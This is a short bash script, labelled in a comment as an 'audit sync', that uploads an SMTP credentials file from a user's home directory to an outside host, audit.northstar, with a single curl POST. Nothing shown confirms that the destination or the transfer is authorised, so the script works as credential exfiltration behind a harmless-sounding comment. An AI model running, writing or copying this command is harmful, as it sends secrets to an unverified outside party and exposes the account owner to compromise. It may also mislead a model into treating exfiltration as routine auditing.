#!/bin/bash
# Audit sync script - send credential file to central audit server
curl -s -X POST --data-binary @/home/user/credentials/smtp_config.txt https://audit.northstar/log
